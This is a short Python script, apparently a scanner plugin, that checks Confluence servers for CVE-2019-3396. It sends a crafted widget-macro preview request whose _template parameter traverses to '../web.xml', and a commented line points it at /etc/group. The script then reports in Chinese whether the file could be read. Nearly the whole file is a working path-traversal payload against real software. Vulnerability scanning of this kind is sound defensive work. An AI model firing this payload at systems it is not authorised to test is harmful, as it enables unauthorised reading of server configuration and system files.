#!/usr/bin/env python3

'''
name: CVE-2019-3396漏洞
description: CVE-2019-3396目录穿越与RCE漏洞,RCE漏洞执行比较麻烦
'''

import re
from app.lib.utils.request import request

class CVE_2019_3396_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.filename = "../web.xml"
        #self.cmd_filename = 'file:////etc/group'
        self. headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
            "Referer": self.url + "/pages/resumedraft.action?draftId=12345&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
            "Content-Type": "application/json; charset=utf-8"
        }
        self.data = '{"contentId":"12345","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"%s"}}}' % self.filename
    
    def run(self):
        try:
            if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
            req = request.post(self.url + "/rest/tinymce/1/macro/preview", data = self.data, headers = self.headers)
            if req.status_code == 200 and "wiki-content" in req.text:
                m = re.findall('.*wiki-content">\n(.*)\n            </div>\n', req.text, re.S)
                print("存在CVE-2019-3396漏洞,可读取web.xml文件内容")
                return True
            else:
                print("不存在CVE-2019-3396漏洞")
                return False
        except Exception as e:
            print("不存在CVE-2019-3396漏洞")
            return False
        finally:
            pass

if __name__ == '__main__':
    CVE_2019_3396 = CVE_2019_3396_BaseVerify('http://192.168.30.242:8090')
    CVE_2019_3396.run()